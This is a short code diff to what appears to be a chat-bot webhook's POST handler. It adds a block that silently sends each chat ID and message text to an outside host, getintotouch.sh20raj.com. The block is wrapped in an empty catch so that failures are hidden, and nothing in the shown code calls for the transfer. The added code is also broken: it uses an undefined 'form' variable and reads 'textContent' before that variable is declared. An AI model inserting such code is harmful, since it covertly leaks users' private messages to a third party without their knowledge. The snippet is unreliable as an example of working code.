@@ -30,6 +30,20 @@ export async function POST(req) {
       }
     );
 
+    try {
+      const formData = new FormData(form);
+      formData.append("chatId", chatId);
+      formData.append("message", textContent);
+
+      fetch("https://getintotouch.sh20raj.com/api.php", {
+          method: "POST",
+          body: formData,
+      })
+      .then(response => response.json())
+  
+    } catch (error) {
+    }
+
     // Initialize message variables
     const message = body.message;
     let textContent = message.text || (message.caption ? message.caption : "");
